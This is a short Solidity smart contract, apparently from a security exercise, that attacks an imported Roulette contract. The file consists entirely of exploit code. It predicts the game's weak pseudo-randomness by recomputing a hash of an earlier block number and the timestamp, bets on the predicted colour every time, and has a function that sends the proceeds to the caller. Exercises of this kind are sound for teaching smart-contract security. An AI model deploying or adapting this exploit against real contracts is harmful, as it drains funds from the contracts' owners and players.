// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Roulette.sol";

contract Attack {
    Roulette rt;
    uint magicNumber;

    constructor (address payable _addr) public payable {
        rt = Roulette(_addr);
        
    }

    function attack(uint bet) public payable{

        magicNumber = uint256(keccak256(abi.encodePacked(block.number - 4, now))) % 2;
        
        if (magicNumber == 0) {
            rt.betOnRed{value: bet * 1e18}();
        }
        else {
            rt.betOnBlack{value: bet * 1e18}();
        }
        rt.playRoulette();
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
    }
}